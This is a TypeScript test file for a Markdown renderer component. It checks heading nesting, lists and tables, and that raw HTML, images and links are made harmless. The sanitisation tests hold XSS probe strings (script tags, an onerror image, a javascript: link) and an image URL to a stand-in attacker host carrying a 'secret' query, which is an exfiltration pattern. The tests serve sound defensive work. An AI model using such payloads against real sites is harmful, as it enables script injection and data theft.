import { beforeAll, describe, expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "./Markdown";
import { loadStreamdown } from "./streamdown-lazy";

/**
 * A person's Markdown as the renderer draws it, once its chunk is here:
 * the outline continued under the page's, and whatever HTML was written
 * shown as the characters it is.
 */
beforeAll(async () => {
	await loadStreamdown();
});

const draw = (source: string, under = 2) =>
	renderToStaticMarkup(<Markdown source={source} under={under} />);

describe("a person's Markdown", () => {
	test("headings continue the outline they sit under", () => {
		const out = draw("# One\n\n## Two\n\n###### Six", 2);
		expect(out).toMatch(/<h3[^>]*>One<\/h3>/);
		expect(out).toMatch(/<h4[^>]*>Two<\/h4>/);
		expect(out).toMatch(/<h6[^>]*>Six<\/h6>/);
		expect(out).not.toContain("node=");
		expect(draw("# One", 0)).toMatch(/<h1[^>]*>One<\/h1>/);
	});

	test("lists, emphasis and tables are elements", () => {
		const out = draw(
			"- *a*\n- **b**\n\n1. one\n\n| k | v |\n|---|---|\n| x | y |",
		);
		expect(out).toMatch(/<ul[^>]*>/);
		expect(out).toContain("<em>a</em>");
		expect(out).toMatch(/<(strong|span)[^>]*>b<\/(strong|span)>/);
		expect(out).toMatch(/<ol[^>]*>/);
		expect(out).toMatch(/<td[^>]*>y<\/td>/);
	});

	test("HTML, as a block or inside a line, is text", () => {
		const out = draw(
			'<script>alert(1)</script>\n\n<img src=x onerror="alert(1)">\n\nsay <iframe src="https://example.com"></iframe> here',
		);
		expect(out).not.toMatch(/<(script|img|iframe)/);
		expect(out).toMatch(/<p>&lt;script&gt;alert\(1\)&lt;\/script&gt;<\/p>/);
		expect(out).toMatch(
			/<p>&lt;img src=x onerror=&quot;alert\(1\)&quot;&gt;<\/p>/,
		);
		expect(out).toContain("say &lt;iframe");
	});

	test("an image naming another host is its words alone, never fetched from the URL written", () => {
		const out = draw(
			"see ![a](https://evil.example/x.png?d=secret) and ![b](/\\evil.example/y.png)",
		);
		const sources = [...out.matchAll(/(?:src|href)="([^"]*)"/g)].map(
			(m) => m[1],
		);
		expect(out).not.toContain("evil.example/x.png");
		expect(out).toContain(">a<");
		// The renderer encodes the backslash, which leaves a path on this origin, but not a picture's: its words alone too.
		expect(sources).toHaveLength(0);
		expect(out).toContain(">b<");
		expect(out).not.toContain("<link");
		expect(out).not.toContain("Download");
	});

	test("a script link is no link", () => {
		const out = draw(
			"[click](javascript:alert(1)) and [site](https://example.com)",
		);
		expect(out).not.toContain("javascript:");
		expect(out).toContain('href="https://example.com/"');
	});
});
